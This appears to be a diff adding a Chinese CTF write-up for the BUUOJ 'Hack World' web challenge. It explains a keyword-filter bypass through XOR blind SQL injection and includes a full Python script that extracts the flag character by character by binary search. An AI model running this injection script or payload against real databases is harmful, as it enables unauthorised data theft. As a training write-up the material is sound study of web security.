@@ -264,3 +264,70 @@ select * from 'admin' where password= '' or '6xxxxx'
 
 - [CTF中常见php-MD5()函数漏洞](https://www.loongten.com/2020/02/22/ctf-php-md5/)
 
+## 0x04 [CISCN2019 华北赛区 Day2 Web1]Hack World
+
+[题目链接](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)
+
+![image-20210813220634873](image-20210813220634873.png "首页")
+
+试一下就知道，`or` `and` `union` 等关键字都被过滤了，所以不能**union注入**或者**报错**注入。
+
+以及输入`1`和`2`是可以看到正常的回显结果的
+
+```txt
+1：Hello, glzjin wants a girlfriend.
+2：Do you want to be my girlfriend?
+```
+
+google之后可以知道，还有一种注入叫做[异或注入](https://cbatl.gitee.io/2020/06/20/xor/)，这也是这题的考察点。
+
+所以思路就是使用异或注入，逐位爆破flag的内容。
+
+直接上脚本，注意每次请求之间加个`sleep`，不然会出错，因为请求之间间隔太短，导致收到的结果可能会顺序错乱。
+
+```python
+import requests as rq
+import time
+
+host = 'http://ac7a6112-32f7-48c9-9088-66a935888686.node4.buuoj.cn:81/index.php'
+
+flag = ""
+payload = {
+    "id": ""
+}
+for i in range(1, 50):
+    # 二分查找很细节
+    a = 32
+    b = 128
+    m = (a + b) >> 1
+    while a < b:
+        payload["id"] = "0^(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i, m)
+        # print(payload["id"])
+        se = rq.post(url=host, data=payload)
+        # 请求发太快了容易出问题，所以这里的sleep是必须的
+        # time.sleep(0.1)
+        # 如果猜的数字更小
+        if "Hello" in se.text:
+            a = m + 1
+        else:
+            b = m
+        m = (a + b) >> 1
+    # print("m: ", m, "chr(m): ", chr(m))
+    if chr(m) == " ":
+        break
+    flag += chr(m)
+    print(flag)
+
+print("flag: ", flag)
+
+```
+
+
+
+
+
+
+
+
+
+
